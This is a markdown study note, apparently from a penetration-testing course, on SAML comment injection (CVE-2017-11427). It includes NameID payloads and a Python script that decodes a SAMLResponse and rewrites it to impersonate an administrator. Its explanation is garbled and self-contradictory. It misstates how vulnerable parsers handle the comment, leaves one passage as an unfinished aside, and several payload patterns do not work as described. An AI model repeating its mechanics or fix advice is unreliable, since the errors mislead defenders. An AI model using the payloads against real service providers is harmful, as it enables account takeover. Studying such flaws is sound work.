---
tags: [vapt, saml, intermediate]
difficulty: intermediate
module: "20 - SAML"
topic: "20.06 SAML Comment Injection"
---

# 06 — SAML Comment Injection

## The Attack

```
XML COMMENTS: <!-- anything here -->
  Valid XML syntax, content is ignored by XML parsers

BUT:
  Some SAML implementations extract NameID using TEXT NODE parsing
  vs.
  Others parse the entire element including comments
  
  AND:
  XML normalizes text: adjacent text nodes are concatenated
  Comments are BETWEEN text nodes!
  
  EXAMPLE:
  <saml:NameID>admin<!--comment-->@evil.com</saml:NameID>
  
  TEXT NODE EXTRACTION:
  Some parsers: "admin" + TEXT_NODE + "@evil.com"
  → ignores comment → gets "admin@evil.com"!
  
  FULL TEXT EXTRACTION:
  Other parsers: "admin<!--comment-->@evil.com"
  → includes comment text → gets "admin<!--comment-->@evil.com"
  
  If the IdP sees: admin@evil.com (stripped comment)
  And the SP sees: admin@evil.com (differently parsed)
  → ATTACK!
```

---

## Real CVE: CVE-2017-11427

```
AFFECTED: Multiple SAML implementations including:
  - Ruby-saml (before 1.7.2)
  - OneLogin Python-saml (before 2.3.0)
  - Shibboleth (before 2.6.1)
  
THE VULNERABILITY:
  NameID parsed using incorrect text extraction
  
  PAYLOAD:
  <saml:NameID>admin<!--ignore-this-->@notevil.com</saml:NameID>
  
  VULNERABLE LIBRARY EXTRACTS: "admin@notevil.com"
  (skips the comment, joins surrounding text)
  
  IF: attacker controls a legitimate SAML account at notevil.com
  AND: signs in legitimately → gets valid assertion for:
    attacker@notevil.com
  THEN: manually modifies assertion to:
    admin<!--@notevil.com-->@evil.com
  
  (so the signature covers "admin@notevil.com" ← the signed data)
  but SP parses as: "admin" + (comment) + "@evil.com" = "admin@evil.com"
  
  Actually the classic payload is:
  <!-- after the username: 
    real NameID signed: "admin@company.com"
    modified: "admin<!--comment-->@company.com"
    
    some SPs: extract text nodes → "admin" + "@company.com" → "admin@company.com"
    but the original signed content was longer/different
    
    The signature covers the element INCLUDING the comment
    SP might get admin@company.com but verification was on admin<!--...-->@company.com
  -->
```

---

## Practical Exploitation

```
PREREQUISITES:
  1. SP vulnerable to comment injection parsing
  2. Attacker can intercept and modify SAMLResponse
     (After getting their own valid assertion)
  
  BASIC PAYLOAD PATTERNS:
  
  Pattern 1: Simple comment in NameID
  Original signed: john@company.com
  Modified: john<!--attacker@evil.com-->@company.com
  → SP parses: "john" + "@company.com" = "john@company.com"? (same)
  → Actually: modified to inject TARGET username:
  
  Pattern 2: Admin injection
  Attacker logs in as: attacker@evil.com
  Gets signed assertion for: attacker@evil.com
  Modifies: a<!--ttacker@evil.com
            admin-->dmin@company.com
  
  This is tricky because the modification must not break the signature!
  But some XML canonicalization removes comments before signing:
  → Comment added AFTER signing → signature still valid!
  → But SP sees modified NameID!

TESTING:
  1. Complete SAML login with attacker-controlled account
  2. Decode assertion → modify NameID with comments:
     <saml:NameID>admin<!--INJECTED-->@company.com</saml:NameID>
  3. Re-encode → submit
  4. Check: are you logged in as admin@company.com?
```

---

## Detecting the Vulnerability

```bash
# TEST COMMENT INJECTION:
# 1. Get your own valid SAML assertion
# 2. Decode it
# 3. Modify NameID to include XML comment

# Python:
import base64

saml_b64 = "YOUR_VALID_SAML_RESPONSE"
xml = base64.b64decode(saml_b64).decode()

# Inject comment after your username (before @):
# If your account is: attacker@evil.com
# Try to become: admin@company.com
xml_modified = xml.replace(
    '<saml:NameID Format="...">attacker@evil.com</saml:NameID>',
    '<saml:NameID Format="...">admin<!--attacker@evil.com-->@company.com</saml:NameID>'
)

# Note: This modifies the signed element → signature should fail
# UNLESS: canonicalization removed the comment before signing!

# Re-encode and test:
print(base64.b64encode(xml_modified.encode()).decode())

# CHECK LIBRARY VERSION:
# Python:
pip show python3-saml | grep Version
# Fixed in: python3-saml ≥ 2.3.0

# Ruby:
gem list ruby-saml
# Fixed in: ruby-saml ≥ 1.7.2
```

---

## Fix

```
PREVENTING COMMENT INJECTION:

1. UPDATE SAML LIBRARIES (most important!):
   python3-saml: ≥ 2.3.0
   ruby-saml: ≥ 1.7.2
   Shibboleth: ≥ 2.6.1
   
   These libraries were patched to extract NameID correctly

2. REJECT XML WITH COMMENTS:
   Pre-process the XML: strip all comments before parsing
   
   Python:
   import lxml.etree as ET
   
   def strip_comments(xml_str):
       tree = ET.fromstring(xml_str.encode())
       # Remove all comment nodes:
       for comment in tree.xpath("//comment()"):
           comment.getparent().remove(comment)
       return ET.tostring(tree)
   
   # OR:
   from lxml import etree
   parser = etree.XMLParser(remove_comments=True)
   tree = etree.fromstring(xml_bytes, parser=parser)

3. USE CANONICAL XML WHEN EXTRACTING TEXT:
   XPath that correctly extracts text content only:
   normalize-space(string(//saml:NameID))
   → Gets text nodes only, not comments

4. SCHEMA VALIDATION:
   SAML schema might not allow comments in specific elements
   Validate against strict schema → reject if non-conforming
```

---

## Related Notes
- [[02 - SAML Assertion Structure]] — NameID element
- [[03 - XML Signature Wrapping (XSW) Attacks]] — other XML manipulation attacks
- [[07 - SAML External Entity (SAML + XXE)]] — other XML injection
- [[10 - Defense — Strict Schema Validation, Signed Assertions]] — full fix
